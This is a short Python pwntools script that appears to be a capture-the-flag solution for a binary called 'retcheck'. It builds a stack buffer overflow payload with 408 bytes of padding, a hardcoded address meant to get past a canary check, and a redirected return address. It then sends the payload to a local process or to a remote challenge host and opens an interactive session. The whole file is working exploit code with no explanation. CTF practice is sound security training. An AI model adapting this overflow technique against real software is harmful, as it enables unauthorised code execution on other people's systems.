#!/usr/bin/env python
from pwn import *

# Definitions
e = context.binary = ELF('./retcheck',checksec=False)

if args.REMOTE:
    io = remote('challenge.ctf.games',31463)
else:
    io = process(e.path)

# Exploit
overflow = 408*'A' 
overflow += p64(0x401465) # bypass canary
overflow += p64(0) # rbp
overflow += p64(0x4012e9) # return address

if args.GDB:
    gdb.attach(io,'b*0x401414\nb*0x4012e9\nc')
io.recvrepeat(0.1)
io.sendline(overflow)

io.interactive()